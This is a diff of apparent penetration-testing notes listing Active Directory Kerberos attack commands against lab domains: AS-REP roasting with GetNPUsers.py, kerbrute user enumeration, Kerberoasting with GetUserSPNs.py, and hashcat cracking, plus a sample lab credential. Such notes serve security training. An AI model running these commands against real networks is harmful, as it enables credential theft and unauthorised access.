@@ -49,12 +49,11 @@ Get-ASREPHash -Username VPN114user -verbose
 # Linux
 # GetNPUsers
 ## Try all the usernames in usernames.txt
-GetNPUsers.py <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip 172.16.2.5
-GetNPUsers.py   <domain>/  -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast  -dc-ip 172.16.2.5
+GetNPUsers.py <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip 172.16.2.5  -no-pass 
+## try one username
 GetNPUsers.py <domain>/<username>  -format hashcat -outputfile hashes.asreproast -dc-ip 10.129.159.45 -no-pass  
-
-## Use domain creds to extract targets and target them
-GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+## Use domain creds 
+GetNPUsers.py <domain>/<username>:<pass> -request -format hashcat -outputfile hashes.asreproast
 
 # kerbrute
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
@@ -78,7 +77,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 # Listing SPN Accounts with GetUserSPNs.py
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 
-# Requesting all TGS Tickets
+# Requesting all TGS Tickets that this user can request 
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
 
 # Requesting a Single TGS ticket
